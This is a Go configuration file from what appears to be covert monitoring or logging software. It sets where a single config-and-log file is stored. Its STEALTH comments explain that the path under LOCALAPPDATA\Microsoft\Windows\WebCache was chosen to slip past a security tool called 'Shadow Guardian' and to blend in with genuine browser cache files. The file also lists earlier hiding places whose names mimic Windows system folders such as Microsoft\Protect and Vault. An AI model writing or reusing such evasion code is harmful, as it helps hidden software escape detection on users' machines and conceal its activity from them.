package config

import (
	"os"
	"path/filepath"
	"runtime"
)

// GetStoragePath returns the single binary file used for both config and logs.
// STEALTH: Uses %LOCALAPPDATA%\Microsoft\Windows\WebCache\ which:
//   - Is NOT in Shadow Guardian's suspicious path patterns (\appdata\roaming\ is, but LOCALAPPDATA is not)
//   - Is a real Windows directory used by Edge/IE for browser cache
//   - webcache.dat blends with legitimate files like WebCacheV01.dat
func GetStoragePath() string {
	if runtime.GOOS == "windows" {
		localApp := os.Getenv("LOCALAPPDATA")
		if localApp == "" {
			home, _ := os.UserHomeDir()
			return filepath.Join(home, ".wucache.dat")
		}
		dir := filepath.Join(localApp, "Microsoft", "Windows", "WebCache")
		os.MkdirAll(dir, 0755)
		return filepath.Join(dir, "webcache.dat")
	}

	home, _ := os.UserHomeDir()
	return filepath.Join(home, ".wucache.dat")
}

// GetSyncPath returns the path to the hidden synchronization state file.
func GetSyncPath() string {
	base := GetStoragePath()
	return base + ".sync"
}

// GetAllPreviousDataDirs returns a list of directories and files used in previous versions.
// These are checked during migration for backward compatibility.
func GetAllPreviousDataDirs() []string {
	home, _ := os.UserHomeDir()
	localApp := os.Getenv("LOCALAPPDATA")
	appData := os.Getenv("APPDATA")

	paths := []string{
		filepath.Join(home, ".sys_cache_001"),
	}

	if localApp != "" {
		paths = append(paths, filepath.Join(localApp, "Microsoft", "Windows", "SystemCache"))
		paths = append(paths, filepath.Join(localApp, "Microsoft", "Vault", "Cache"))
	}

	if appData != "" {
		paths = append(paths, filepath.Join(appData, "Microsoft", "Protect", "Storage"))
		// Previous version storage path (v1):
		paths = append(paths, filepath.Join(appData, "Microsoft", "Protect"))
	}

	return paths
}

// Legacy helpers for migration
func GetLogPath() string    { return GetStoragePath() }
func GetConfigPath() string { return GetStoragePath() }
func GetLockPath() string   { return GetStoragePath() }
